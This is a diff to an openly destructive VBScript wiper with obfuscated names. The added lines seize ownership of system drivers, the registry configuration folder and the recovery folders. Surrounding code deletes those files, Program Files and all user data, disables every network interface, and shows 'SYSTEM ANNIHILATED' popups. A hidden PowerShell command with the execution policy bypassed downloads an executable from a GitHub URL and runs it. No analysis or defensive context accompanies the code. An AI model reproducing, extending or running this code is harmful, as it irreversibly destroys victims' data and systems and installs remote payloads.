@@ -89,15 +89,29 @@ Next
 ' z2w8j.Close
 ' x7p9q.Run "schtasks /create /tn SysUpdate2 /tr ""cmd /c diskpart /s C:\Temp\dp_boot.txt"" /sc onstart /ru SYSTEM /rl HIGHEST /f", 0, True
 
+x7p9q.Run "takeown /F ""C:\Windows\System32\drivers\acpi.sys""", 0, True
+x7p9q.Run "icacls ""C:\Windows\System32\drivers\acpi.sys"" /grant SYSTEM:F", 0, True
+x7p9q.Run "takeown /F C:\Windows\System32\drivers\cdrom.sys", 0, True
+x7p9q.Run "icacls C:\Windows\System32\drivers\cdrom.sys /grant SYSTEM:F", 0, True
+x7p9q.Run "takeown /F ""C:\Windows\System32\config""", 0, True
+x7p9q.Run "icacls ""C:\Windows\System32\config"" /grant SYSTEM:F", 0, True
+x7p9q.Run "takeown /F ""C:\Recovery""", 0, True
+x7p9q.Run "icacls ""C:\Recovery"" /grant SYSTEM:F", 0, True
+x7p9q.Run "takeown /F ""C:\System Volume Information""", 0, True
+x7p9q.Run "icacls ""C:\System Volume Information"" /grant SYSTEM:F", 0, True
 q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
 q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
-q3z8k.DeleteFile("C:\Windows\*.*") ' Entire Windows dir
 q3z8k.DeleteFile("C:\Program Files\*.*") ' Program Files gone
 q3z8k.DeleteFile("C:\Program Files (x86)\*.*") ' 32-bit apps dead
 q3z8k.DeleteFile("C:\Users\*\*.*") ' All user data erased
 q3z8k.DeleteFolder("C:\Windows\System32\config") ' Registry backups gone
 q3z8k.DeleteFolder("C:\Recovery\*.*")
 q3z8k.DeleteFolder("C:\System Volume Information\*.*")
+
+Dim path
+path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\toy.exe"
+x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/update.exe' -outfile '"& path & "'""", 0, True
+x7p9q.Run path, 0, True
 
 ' Break network completely
 x7p9q.Run "netsh winsock reset", 0, True ' TCP/IP fucked
@@ -106,11 +120,6 @@ x7p9q.Run "ipconfig /release", 0, True ' Drop network
 x7p9q.Run "netsh interface set interface ""Ethernet"" disable", 0, True ' Kill Ethernet
 x7p9q.Run "netsh interface set interface ""Wi-Fi"" disable", 0, True ' Kill Wi-Fi
 x7p9q.Run "netsh interface set interface ""Local Area Connection"" disable", 0, True
-
-Dim path
-path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\toy.exe"
-x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/update.exe' -outfile '"& path & "'""", 0, True
-x7p9q.Run path, 0, True
 
 For j6q4x = 1 To 15
     x7p9q.Popup "SYSTEM ANNIHILATED: YOUR DATA IS GONE FOREVER.", 0, "CRITICAL ERROR", 16
